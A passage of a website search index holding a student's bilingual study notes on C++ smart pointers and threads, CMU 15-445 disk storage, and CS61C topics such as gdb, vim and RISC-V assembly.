};\n\u6b63\u786e\u505a\u6cd5\nstd::shared_ptr&lt;Resource&gt; ptr1{ res };\nstd::shared_ptr&lt;Resource&gt; ptr2 { ptr1 };\n</code></pre> <p>unique_ptr\u53ef\u4ee5\u8f83\u4e3a\u5b89\u5168\u5730\u8f6c\u6362\u6210\u4e00\u4e2ashared_ptr\uff0c\u53cd\u4e4b\u5219\u4e0d\u7136</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/advanced%20C%2B%2B/#_4","title":"\u591a\u7ebf\u7a0b","text":"<p>\u53c2\u8003\uff1aC++ \u591a\u7ebf\u7a0b\u7f16\u7a0b\uff08\u4e00\uff09\uff1astd::thread\u7684\u4f7f\u7528 | \u6240\u5ff5\u7686\u661f\u6cb3 (immortalqx.github.io)</p> <p>\u3010C++11 \u591a\u7ebf\u7a0b\u3011future\u4e0epromise\uff08\u516b\uff09 - fengMisaka - \u535a\u5ba2\u56ed (cnblogs.com)</p> <p>\u7531\u4e8e\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u7ed9\u591a\u7ebf\u7a0b\u63d0\u4f9b\u7684\u63a5\u53e3\u4e0d\u540c\uff0c\u5728C++11\u4e4b\u540e\uff0ccpp\u7ed9std\u7684\u591a\u7ebf\u7a0b\u505a\u4e86\u4e00\u4e2a\u5c01\u88c5\uff0c\u6709\u4e86\u8de8\u5e73\u53f0\u7684\u9002\u7528\u6027\uff0c\u8981\u4f7f\u7528<code>std::thread</code>\u4ee5\u53ca\u76f8\u5173\u7684\u7c7b\u548c\u51fd\u6570\uff0c\u9700\u8981\u5f15\u5165<code>#include&lt;thread&gt;</code></p> <p>\u591a\u7ebf\u7a0b\u7684\u6838\u5fc3\u662f\u5171\u4eab\u6570\u636e\u7684\u7ba1\u7406\u4ee5\u53ca\u7ebf\u7a0b\u95f4\u7684\u901a\u4fe1</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/advanced%20C%2B%2B/#stdthread","title":"std::thread","text":"<pre><code>#include &lt;cstdint&gt;\n#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n#include &lt;iterator&gt;\n#include &lt;thread&gt;\nvoid func(int k){\n    std::cout&lt;&lt;k;\n}\nint main(){\n    for(std::uint8_t i = 0;i &lt; 4;i++){\n        std::thread t(func,i);\n        t.detach();\n    }\n    std::getchar();\n    return 0;\n}\n</code></pre> <p>\u4e0a\u8ff0\u662f\u4e00\u4e2a\u57fa\u7840\u7684\u591a\u7ebf\u7a0b\u7a0b\u5e8f\uff0c\u5176\u5305\u542b\u4e24\u4e2a\u91cd\u8981\u90e8\u5206</p> <ul> <li><code>std::thread</code>\u7684\u521b\u5efa\uff0c\u8fdb\u7a0b\u53ef\u4ee5\u628a\u81ea\u8eab\u4e00\u90e8\u5206\u7684\u6307\u4ee4\u5e8f\u5217\uff08\u4e00\u822c\u5c31\u662f\u51fd\u6570\uff09\u62ff\u51fa\u6765\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u540e\u9762\u7684\u53c2\u6570\u5c31\u662f\u8981\u8f93\u5165\u7ed9\u8fd9\u4e2a\u51fd\u6570\u7684\u53c2\u6570</li> <li><code>detach()</code> \u7ebf\u7a0b\u7684\u65b9\u6cd5\uff0c\u8868\u660e\u4e86\u8be5\u7ebf\u7a0b\u4e0d\u963b\u585e\uff0c\u7ebf\u7a0b\u7684\u6307\u4ee4\u5728\u540e\u53f0\u8fd0\u884c\uff0c\u8fdb\u7a0b\u7684\u7a0b\u5e8f\u53ef\u4ee5\u987a\u5e8f\u6267\u884c\u4e0b\u53bb</li> </ul> <p>\u4e0a\u8ff0\u4ee3\u7801\u542f\u52a8\u4e86\u56db\u4e2a\u7ebf\u7a0b\uff0c\u57fa\u7840\u610f\u4e49\u4e0a\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u662ffunc()\u88ab\u8c03\u7528\u4e864\u6b21\uff0c\u4f46\u662f\u8f93\u51fa\u7684\u7ed3\u679c\u662f 0 1 2 3\u7684\u4e71\u5e8f\uff0c\u57284\u4e2a\u5e76\u884c\u7684\u7ebf\u7a0b\u4e2d\uff0c\u8f93\u51fa\u7a97\u53e3\u662f\u552f\u4e00\u7684\uff0c\u56e0\u6b64\u7ebf\u7a0b\u4e4b\u95f4\u4f1a\u4e92\u76f8\u62a2\u5360\u8f93\u51fa\u7a97\u53e3\uff0c\u800c\u4efb\u4f55\u4e00\u4e2a\u65f6\u95f4\u70b9\u8f93\u51fa\u7a97\u53e3\u88ab\u5206\u914d\u7ed9\u54ea\u4e2a\u7ebf\u7a0b\u5bf9\u4e8e\u6211\u4eec\u662f\u4e0d\u53ef\u9884\u89c1\u7684</p> <p>\u7b49\u5f85\u7ebf\u7a0b\u7ed3\u675f</p> <p>C++\u4e2d\u7684thread\u5728\u5176\u88ab\u9500\u6bc1\u4e4b\u524d\uff0c\u5fc5\u987b\u786e\u5b9a\u5176\u7ed3\u675f\u7684\u65b9\u5f0f\uff0c\u6709\u4e24\u79cd</p> <ul> <li>\u8c03\u7528detach\u51fd\u6570\uff0c\u7ebf\u7a0b\u653e\u5230\u540e\u53f0\u6267\u884c\uff0c\u4ee3\u7801\u7ee7\u7eed\u6267\u884c\u4e0b\u53bb\u3002\u8c03\u7528\u5b8cdetach\u4e4b\u540e\uff0c\u8be5\u7ebf\u7a0b\u5bf9\u8c61\u5df2\u7ecf\u4e0e\u6240\u7ba1\u7406\u7684\u7ebf\u7a0b\u5206\u79bb</li> <li>\u8c03\u7528join\u51fd\u6570\uff0c\u963b\u585e\u7b49\u5230\u7ebf\u7a0b\u6267\u884c\u5b8c\u5728\u8fdb\u884c\u4e0b\u4e00\u6b65\u64cd\u4f5c\uff0c\u53ea\u6709\u6d3b\u8dc3\u7ebf\u7a0b\u624d\u80fd\u8c03\u7528join\uff0c\u53ef\u4ee5\u901a\u8fc7joinable()\u67e5\u770b\u8be5\u7ebf\u7a0b\u662f\u4e0d\u662f\u6d3b\u8dc3\u7ebf\u7a0b</li> </ul> <p>\u5982\u82e5\u4e0d\u8c03\u7528\u4e0a\u8ff0\u51fd\u6570\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38</p> <p>\u7ebf\u7a0b\u4f20\u53c2</p> <p>\u9ed8\u8ba4\u4f1a\u4ee5\u62f7\u8d1d\u7684\u65b9\u5f0f\u5c06\u53c2\u6570\u4f20\u5165\u7ebf\u7a0b\u4e2d\uff0c\u5373\u4fbf\u5728\u53c2\u6570\u4e2d\u4f7f\u7528\u7684\u5f15\u7528\uff0c\u5982\u679c\u9700\u8981\u5728\u7ebf\u7a0b\u4e2d\u4f20\u5165\u5f15\u7528\uff0c\u5219\u9700\u8981\u8c03\u7528<code>std::ref()</code></p> <ul> <li>\u7ebf\u7a0b\u662f\u53ef\u79fb\u52a8\u7684\uff0c\u4f46\u662f\u662f\u4e0d\u53ef\u62f7\u8d1d\u7684</li> <li>\u7ebf\u7a0b\u6709\u5176\u552f\u4e00\u7684id\uff0c\u5bf9\u4e8e\u7ebf\u7a0b\u5bf9\u8c61\u800c\u8a00\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528get_id()\u83b7\u53d6\uff1b\u5728\u7ebf\u7a0b\u7a7a\u95f4\u4e4b\u4e2d\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528<code>this_thread::get_id()</code> \u83b7\u53d6</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/advanced%20C%2B%2B/#stdfuture-and-stdpromise","title":"std::future and std::promise","text":"<p>\u4ec5\u4ec5\u4f9d\u9760\u4e0a\u8ff0\u6982\u5ff5\uff0c\u6211\u4eec\u8981\u5b9e\u73b0\u8fdb\u7a0b\u4e4b\u95f4\u901a\u4fe1\u4ee5\u53ca\u534f\u4f5c\u8fd8\u4e0d\u591f\u4fbf\u5229</p> <ul> <li>std::future \u8868\u793a\u4e00\u4e2a\u53ef\u80fd\u8fd8\u672a\u5b9e\u9645\u5b8c\u6210\u7684\u5f02\u6b65\u4efb\u52a1\u7684\u7ed3\u679c\uff0c\u5176\u62e5\u6709\u4e00\u4e2aget\u65b9\u6cd5\uff0c\u4f1a\u963b\u585e\u4e3b\u8fdb\u7a0b\uff0c\u76f4\u5230future\u5c31\u7eea</li> <li>std::promise \u7531\u4efb\u52a1\u8c03\u7528\u8005\u8d1f\u8d23\uff0c\u5176\u672c\u8eab\u662f\u4f5c\u4e3a</li> </ul> <p>\u591a\u6570\u60c5\u51b5\u4e0bstd::future\u4f1a\u4f9d\u8d56\u8fd9\u4e09\u79cd\u65b9\u5f0f\u521b\u5efa</p> <ul> <li><code>std::async</code>\u51fd\u6570\uff0c\u672c\u6587\u540e\u9762\u4f1a\u4ecb\u7ecd</li> <li><code>std::promise::get_future</code>\uff0cget_future \u4e3a promise \u7c7b\u7684\u6210\u5458\u51fd\u6570</li> <li><code>std::packaged_task::get_future</code>\uff0c\u6b64\u65f6 get_future\u4e3a packaged_task \u7684\u6210\u5458\u51fd\u6570</li> </ul> <p>std::future \u548c std::promise \u7684\u4f7f\u7528\u4f8b\u5b50</p> <pre><code>void fun(int x, int y, std::promise&lt;int&gt;&amp; promiseObj) {\n    promiseObj.set_value(x + y);\n}\n\nint main()\n{\n    int a = 10;\n    int b = 8;\n\n    // \u58f0\u660e\u4e00\u4e2apromise\u7c7b\n    std::promise&lt;int&gt; promiseObj;\n    // \u5c06future\u548cpromise\u5173\u8054\n    std::future&lt;int&gt; futureObj = promiseObj.get_future();\n    // \u6a21\u677f\u4f20\u53c2\u7684\u65f6\u5019\u4f7f\u7528ref\uff0c\u5426\u5219\u4f20\u53c2\u5931\u8d25\n    std::thread t(fun, a, b, std::ref(promiseObj));\n    t.join();\n\n    // \u83b7\u53d6\u7ebf\u7a0b\u7684\"\u8fd4\u56de\u503c\"\n    int sum = futureObj.get();\n    std::cout &lt;&lt; \"sum=\" &lt;&lt; sum &lt;&lt; std::endl; // \u8f93\u51fa\uff1a18\n\n    std::system(\"pause\");\n    return 0;\n}\n</code></pre> <p>\u5c06promise\u4f5c\u4e3a\u53c2\u6570\u6216\u8005\u53c2\u6570\u7684\u4e00\u90e8\u5206\u4f20\u5165\u7ebf\u7a0b\uff0c\u53ef\u4ee5\u5b9e\u73b0\u7ebf\u7a0b\u548c\u4e3b\u7ebf\u7a0b\u4e4b\u95f4\u7684\u540c\u6b65\uff0c\u5f53\u4e3b\u7ebf\u7a0b\u4e2d\u7684future\u5bf9\u8c61\u8c03\u7528get\u7684\u65f6\u5019\uff0c\u4f1a\u7b49\u5f85\u7ebf\u7a0b\u77e5\u9053promise\u5bf9\u8c61\u88abset_value</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/disk%20storage/","title":"disk storage","text":"<p>\u6211\u4eec\u5728\u672c\u8bfe\u7a0b\u4e2d\u5b66\u4e60\u7684\u4e3b\u8981\u662f\u9762\u5411\u78c1\u76d8\u7684\u6570\u636e\u5e93\uff0cstorage\u8fd9\u90e8\u5206\u7684\u5185\u5bb9\u4e3b\u8981\u8ba8\u8bba\u4e86\u6570\u636e\u5728\u78c1\u76d8\u4e2d\u7684\u5b58\u50a8\u5f62\u5f0f</p> <ul> <li>\u8bfb\u5199\u5185\u5b58\u662f\u968f\u673a\u8bbf\u5b58\u7684\uff0c\u5b57\u8282\u5bfb\u5740\u7684\uff1b</li> <li>\u8bfb\u5199\u78c1\u76d8\u662f\u987a\u5e8f\u8bbf\u5b58\u7684\uff0c\u5757\u5bfb\u5740\u7684</li> </ul> <p>\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u57fa\u672c\u7ec4\u6210\u5355\u5143\u662frecord\uff08\u4e5f\u5c31\u662f\u4e00\u884c\uff09\uff0c\u884c\u7ec4\u6210table\uff0crecord \u7684 type \u53c8\u53ef\u4ee5\u5206\u4e3aFLR\uff0cVLR\u4e24\u79cd</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/disk%20storage/#file-storage","title":"file storage","text":"<p>page\u662f\u6570\u636e\u5728disk\u4e2d\u6700\u57fa\u7840\u7684\u5355\u5143\uff0c\u4e5f\u662fmemory\u548cdisk\u4e4b\u95f4\u8fdb\u884c\u8bfb\u5199\u7684\u6700\u5c0f\u5355\u5143</p> <p>pages\u7684\u6982\u5ff5\uff0c\u6570\u636e\u5e93\u7684page\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u7684page\u65e0\u5173\uff0c\u4e00\u822c\u4f1a\u5728512b-16kb\u4e4b\u95f4\uff0c\u4e00\u822c\u90fd\u4f1a\u57284kb\u4ee5\u4e0a\u7684\u6574\u6570\u500d\uff0c\u56e0\u4e3aos\u662f\u6309\u71674kb\u5212\u5206\u7684\uff0c\u4ec5\u6709\u4e00\u4e9b\u7279\u6b8a\u7684\u5355\u7247\u673a\u7684\u5927\u5c0f\u4f1a\u5c0f\u4e8e4kb</p> <ul> <li>page\u662f\u4e00\u4e2afixed-size block of data</li> <li>most systems don't mix page type\uff0c\u4e00\u4e2apage\u91cc\u9762\u5b58\u50a8\u4e00\u79cd\u6570\u636e\u7c7b\u578b</li> </ul> <p>\u6570\u636e\u7cfb\u7edf\u7ba1\u7406\u4e00\u4e2a\u5927\u7684\u6587\u4ef6\uff0c\u5e76\u4e14\u5c06\u5176\u5212\u5206\u6210\u4e3a\u4e00\u4e2a\u4e2apages\uff0c\u8fd9\u4e2a\u6587\u4ef6\u88ab\u79f0\u4e3aheap file\uff0c\u5185\u90e8\u7684page\u662funordered collection</p> <p>\u6587\u4ef6\u5185\u90e8\u7684\u7ec4\u7ec7\u5f62\u5f0f\u4e3b\u8981\u6709\u4e24\u79cd</p> <ul> <li>\u5934\u90e8\u4e00\u4e2adirectory\uff0c\u5b58\u50a8\u6240\u6709\u6570\u636e\u7684\u6307\u9488</li> <li>\u5934\u90e8\u4e24\u4e2a\u6307\u9488\uff0c\u6307\u5411\u4e00\u4e2adata list\u548c\u4e00\u4e2afree list</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/disk%20storage/#page-storage","title":"page storage","text":"<p>page\u5185\u90e8\u7684\u7ec4\u7ec7\u662f\u4ec0\u4e48\u6837\u7684\uff0c\u5176\u4e3b\u8981\u53ef\u4ee5\u533a\u5206\u6210header\u548cdata\u4e24\u90e8\u5206</p> <p>header\u90e8\u5206\u53ef\u80fd\u4f1a\u8bb0\u5f55\u4ee5\u4e0b\u5185\u5bb9</p> <ul> <li>page size</li> <li>checksum  \u7c7b\u4f3c\u4e8e\u6821\u9a8c\u7801</li> <li>DBMS version \u5bf9\u5e94\u7684\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u7684\u7248\u672c</li> <li>transaction visibility \u5bf9\u4e8e\u7528\u6237\u7684\u900f\u660e\u5ea6</li> <li>compression information  \u538b\u7f29\u7684\u4fe1\u606f\uff0c\u662f\u5426\u88ab\u538b\u7f29</li> </ul> <p>page\u7684\u4e00\u79cd\u7ec4\u7ec7\u65b9\u5f0fslotted page\uff0c\u4e3b\u8981\u9488\u5bf9\u53ef\u53d8\u957f\u5ea6\u7684record\u7ec4\u6210\u7684table</p> <p>\u200b\u200b</p> <p>\u6570\u636e\u5e93\u5185\u90e8\u7d22\u5f15\u6570\u636e\u7684\u65b9\u5f0f\u4e00\u822c\u662f page_id + offset/slot</p> <p>\u4f46\u662f\u8fd9\u4e9b\u7ec4\u7ec7\u662f\u4e0d\u66b4\u9732\u7ed9\u7528\u6237\u7684</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/disk%20storage/#tuple-layout","title":"tuple layout","text":"<p>\u5185\u90e8\u4f9d\u65e7\u662fheader\u548cdata</p> <p>header\u5185\u90e8\u5305\u542b\u4e24\u90e8\u5206\u4fe1\u606f</p> <ul> <li>\u6570\u636e\u900f\u660e\u5ea6</li> <li>null data\u7684\u4fe1\u606f\u8bb0\u5f55</li> </ul> <p>\u200b\u200b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/disk%20storage/#storage-model","title":"storage model","text":"<p>\u6570\u636e\u5e93\u7cfb\u7edf\u5904\u7406\u7684\u8bf7\u6c42\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b</p> <ul> <li>\u666e\u901a\u7528\u6237\u7684\u589e\u5220\u67e5\u6539\uff0c\u5bf9\u4e8e\u6570\u636e\u7684update\u7684\u6027\u80fd\u8981\u6c42\u8f83\u9ad8</li> <li>\u603b\u4f53\u7684\u6570\u636e\u5206\u6790\u4e0e\u5904\u7406\uff0c\u5bf9\u4e8e\u6570\u636e\u67e5\u8be2\u7684\u6027\u80fd\u8981\u6c42\u8f83\u9ad8</li> </ul> <p>\u5bf9\u6b64\u91c7\u7528\u4e0d\u540c\u7684storage model\u662f\u6709\u5fc5\u8981\u7684</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/","title":"CS61C great idea in computer architecture","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#environment-setup","title":"environment setup","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#overview-of-great-ideas","title":"overview of great ideas","text":"<p>Refer to the first PPT</p> <ol> <li>Abstraction (Layers of Representation/Interpretation)</li> <li>Moore\u2019s Law</li> <li>Principle of Locality/Memory Hierarchy</li> <li>Parallelism</li> <li>Dependability via Redundancy</li> </ol>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#number-representation","title":"number representation","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#float-number","title":"float number","text":"<p>We have already learnt the conception of float number in the ZJU-course and we will add some things</p> <p>Biased notation</p> <p>special number</p> <p>If the exponent is 255 and the significand is 0 express endless</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#c-intro","title":"C intro","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#compile","title":"compile","text":"<p>C compiler map the C program directly to the machine code(01-string) Here are two steps, compiling the .c file to .o file and link the .o files into executables.</p> <p>We can have the reaonable compilation time and using the makefiles to allow only modified files to be recompiled. C has the excellent run-time performance.</p> <p>**Note: ** why we use \"slow\" python to do the scientific computation?</p> <p>That's because python has a lot of libraries to accelerate the excutation and some libraries can access the GPU-specific resources.</p> <p>some disadvantages</p> <p>For C, its compile files and executable(\u53ef\u6267\u884c\u6587\u4ef6) are architecture-specfic and os-specific. Executable must be rebuilt on each new system.</p> <p>c pre-processor (cpp</p> <p>C source file first pass through macro processor. It will replace the comments and deal with the cpp commands( begin with #) </p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#variable","title":"variable","text":"<p>the way of name we may use</p> <p>sum_of_squares</p> <p>basic variables</p> <p>The size of the basic variable in different machine is different, So we will recommend use the intN_t  uintN_t</p> <pre><code>int8_t n;  //n will be express in 8 bits\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#macro","title":"macro","text":"<p>macros will be deal with in cpp. It can replace the variable and create a small function. But all it does is string replacement.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#new-features-in-c","title":"new features in C","text":"<p>variable-length non-global array.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#command-arguments","title":"command arguments","text":"<p>\u200b<code>int main(int argc,char *argv[])</code>\u200b </p> <p>argc express the number of strings on the command line, and the argv contains it. The excutable counts is one.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#enums","title":"enums","text":"<pre><code>enum color {RED, GREEN, BLUE};\n</code></pre> <p>enums is a group of related integer constants</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#use-gdb-to-debug","title":"use gdb to debug","text":"<p>Before we begin debug, we should use this command to make the executable file</p> <pre><code>gcc -g -o hello hello.c\n</code></pre> <p>some basic command for gdb</p> <pre><code>q   //quit the debug\nbreak 8 //\u5728\u7b2c\u516b\u884c\u8bbe\u7f6e\u65ad\u70b9\ndelete 8 //\u5220\u9664\u65ad\u70b9\nrun   //\u8fd0\u884c\nc    //continue   \u76f4\u63a5\u7ee7\u7eed\u6574\u4e2a\u7a0b\u5e8f\ns    //step       \u5355\u6b65\u8fdb\u5165\nn    //next line  \u8df3\u5230\u4e0b\u4e00\u884c\np + expression   //print\n</code></pre> <p>basic print format</p> <pre><code>x: \u5341\u516d\u8fdb\u5236\u683c\u5f0f\n\nd\uff1a\u6709\u7b26\u53f7\u7684\u5341\u8fdb\u5236\u6574\u6570\u683c\u5f0f\n\nu\uff1a\u65e0\u7b26\u53f7\u7684\u5341\u8fdb\u5236\u6574\u6570\u683c\u5f0f\n\no\uff1a\u516b\u8fdb\u5236\u6574\u6570\u683c\u5f0f\n\nt\uff1a\u4e8c\u8fdb\u5236\u6574\u6570\u683c\u5f0f\n\nc\uff1a\u5b57\u7b26\u683c\u5f0f\n\nf\uff1a\u6d6e\u70b9\u6570\u683c\u5f0f\n\n\u4f7f\u7528 p/x variable_name \u547d\u4ee4 \u6765\u5b9e\u73b0\u4e0a\u8ff0\u683c\u5f0f\u8f93\u51fa\u7684\u7ed3\u679c\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#using-vim","title":"using vim","text":"<p>\u590d\u5236\u7c98\u8d34</p> <pre><code>//command mode\nv \u9009\u4e2d\ny \u590d\u5236\np \u9ecf\u8d34\n</code></pre> <p>\u6253\u5f00\u65b0\u7684\u6587\u4ef6</p> <pre><code>//command mode\n:e ./filename\n</code></pre> <p>\u663e\u793a\u884c\u53f7</p> <pre><code>set number\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#using-the-valgrind","title":"using the valgrind","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#write-the-makefile","title":"write the makefile","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#risc-v-intro","title":"RISC-V intro","text":"<p>We will use the 32-bit RISC-V in the class.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#the-basic-calculate-instruction","title":"the basic calculate instruction","text":"<pre><code>add rd, rs1, rs2\nsub rd, rs1, rs2\naddi rd, rs1, imme\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#memory-address","title":"memory address","text":"<p>A address and B address has distance of 4 bytes</p> <p>1 word = 4 bytes = 32 bits. And data is rarely smaller than 8 bits.</p> <p>It follows the little-endian convention.</p> 103 102 101 100 0 0 0 1 <p>the result is \"0001\"</p> <p>Get the memory</p> <pre><code>lw x10, 12(x15) // x15 have the address of an int array. So x10 get the A[3]\nsw x10, 40(x15) // put the x10 into the A[10]\n</code></pre> <p>Besides the normal \"lw\" and \"sw\" instructions, RISC-V has byte data transfer instruction. \"lb\" and \"sb\" The number is express bytes</p> <pre><code>lb x10, 3(x15)\nsb x10, 10(x15)\n//this two instrcution is as same as the above two. But they are easier to read \n</code></pre> <p>PC relative addressing</p> <p>It's immediate will jump 4 bytes at once.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#decision-making","title":"decision making","text":"<p>conditional branch</p> <pre><code>beq x1,x2,label\n//if(x1-&gt;value==x2-&gt;value) jump to label;\n</code></pre> <p>\"beq\" jump when equal. \"bne\" jump when unequal</p> <pre><code>blt  //a&lt;b then jump\nbge  //a&gt;b then jump\nbltu //a&lt;b then jump unsigned number\nbgeu //a&gt;b then jump unsigned number\n</code></pre> <p>unconditional branch</p> <pre><code>j label\njr register\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#logical-operation","title":"logical operation","text":"<pre><code>and x1,x2,x3\nxor \nor\nsll\nsrl\n</code></pre> <p>Their is no logical \"not\" in RISC-V, we can use \"xor x1,x1,11111111.. instead</p> <p>We can also use the immediate number during the logical instruction like \"andi x1,x1,3\"</p> <pre><code>sra \nsrai x1,x1,3\n</code></pre> <p>\"sra\" instruction is the right flow with signifance, which we called arithemtic shift. \uff08\u5e26\u7b26\u53f7\u53f3\u79fb)</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#pseudo-code","title":"pseudo code","text":"<p>These assemble code is not the real instruction in the RISC-V design. But they are very useful and  help a lot when understanding the program. So we have them in the RISC-V assemble language.</p> <pre><code>mv rd, rs  //\u628ars\u7684\u503c\u653e\u5230rd\nli rd, 13 //\u628a13\u5199\u5230rd\nnop      //addi x0,x0,0\n</code></pre> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#function-call","title":"function call","text":"<p>The registers a0 to a7 are to pass the parameters. And the a0 and a1 are used as return value.</p> <p>And s0 to s11 are registers that should be saved during the function call.</p> <p>ra (x1) is the return address in the function.</p> <pre><code>jal sum  ; set the ra to next PC and go to the sum label\n</code></pre> <p>Stack structure is used to save some data during the function call, and the normal sp pointer is in 0xFFFFFFF0,</p> <p>The stack will includes</p> <ul> <li>return address</li> <li>arguments</li> <li>other thing we want to save. Like that, if we want to use the save register in the function we need to save them before.</li> </ul> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#register","title":"register","text":"<p>\u200b\u200b</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#program-intro","title":"program intro","text":"<p>For a RISC-V program, how did the program organize, where is the stack pointer and heap pointer.</p> <ol> <li>R-format for register-register arithmetic operations</li> <li>I-format for register-immediate arithmetic operations and loads</li> <li>S-format for stores</li> <li>B-format for branches (minor variant of S-format)</li> <li>U-format for 20-bit upper immediate instructions</li> <li>J-format for jumps (minor variant of U-format)</li> </ol>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/computer%20system/CS61C%20great%20idea%20in%20computer%20architecture/#chisel-intro","title":"chisel intro","text":"<p>chisel is a extend of scala. It is a hardware description 